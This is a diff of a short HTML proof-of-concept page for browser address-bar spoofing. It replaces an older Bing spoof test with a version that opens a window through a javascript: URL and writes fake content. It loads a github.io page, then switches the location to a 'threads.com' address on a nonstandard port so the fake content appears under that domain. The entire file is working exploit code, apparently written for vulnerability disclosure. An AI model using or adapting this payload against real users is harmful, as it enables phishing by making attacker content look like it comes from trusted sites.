@@ -1,9 +1,18 @@
-<script>
-    function spoof() {
-    document.write("<h1>This is not Bing</h1>");
-    document.location = "https://bing.com:1234";
-    setInterval(function(){document.location="https://bing.com:1234@xnxrx.github.io/xnurx/threads.html";},9800);
-    };
+<html>
+ <head>
+  <script>
+  function next() {
+         w.location.replace('https://threads.com:88');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://xnxrx.github.io/xnurx/threads.html'");
+
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+  }
 </script>
-<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
-</p>
+ </head>
+ <body>
+  <center><a href="#" onclick="f()">Click For POC</a></center>
+ </body>
+</html>
